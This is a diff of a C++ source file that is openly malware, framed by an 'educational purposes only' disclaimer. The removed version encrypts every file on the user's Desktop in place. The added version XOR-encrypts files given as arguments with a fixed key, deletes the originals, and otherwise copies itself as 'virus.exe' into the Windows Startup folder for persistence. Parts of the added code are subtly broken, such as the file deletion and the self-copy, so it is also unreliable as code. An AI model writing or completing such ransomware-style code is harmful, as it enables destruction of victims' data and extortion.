@@ -1,43 +1,56 @@
 #include <iostream>
 #include <fstream>
-#include <string>
-#include <windows.h>
+#include <cstdlib>
+#include <cstring>
 
 using namespace std;
 
-string encrypt(string data) {
-    // Your encryption algorithm goes here
-    return data;
-}
+/*
+0x1975
 
-void encryptFiles(string folderPath) {
-    string searchPath = folderPath + "\\*.*";
-    WIN32_FIND_DATA fileData;
-    HANDLE hFind = FindFirstFile(searchPath.c_str(), &fileData);
-    if (hFind != INVALID_HANDLE_VALUE) {
-        do {
-            if (!(fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-                string filePath = folderPath + "\\" + fileData.cFileName;
-                ifstream inFile(filePath.c_str(), ios::binary);
-                if (inFile) {
-                    string fileContent((istreambuf_iterator<char>(inFile)), istreambuf_iterator<char>());
-                    inFile.close();
-                    string encryptedContent = encrypt(fileContent);
-                    ofstream outFile(filePath.c_str(), ios::binary);
-                    outFile.write(encryptedContent.c_str(), encryptedContent.size());
-                    outFile.close();
-                }
-            }
-        } while (FindNextFile(hFind, &fileData));
-        FindClose(hFind);
+This code is for educational purposes only. It is not intended to be used for any malicious or harmful purposes. 
+The author of this code is not responsible for any damage or harm caused by the use of this code. 
+Please use this code responsibly and only for educational purposes. 
+*/
+
+
+void encrypt(char *fileName)
+{
+    ifstream input;
+    ofstream output;
+    input.open(fileName, ios::binary);
+    output.open(strcat(fileName, ".enc"), ios::binary);
+
+    char key = 'K';
+    char byte;
+    while (input >> noskipws >> byte)
+    {
+        byte = byte ^ key;
+        output << byte;
     }
+    input.close();
+    output.close();
+    remove(fileName);
 }
 
-int main() {
-    string desktopPath = getenv("USERPROFILE");
-    desktopPath += "\\Desktop";
-    encryptFiles(desktopPath);
-    // Add more folders to encrypt here
+int main(int argc, char *argv[])
+{
+    if (argc != 1)
+    {
+        for (int i = 1; i < argc; i++)
+        {
+            encrypt(argv[i]);
+        }
+    }
+    else
+    {
+        char *appdata = getenv("APPDATA");
+        char path[255];
+        strcpy(path, appdata);
+        strcat(path, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\virus.exe");
+        ofstream output(path, ios::binary);
+        output.write((char *) &main, (char *) &encrypt - (char *) &main);
+        output.close();
+    }
     return 0;
 }
-
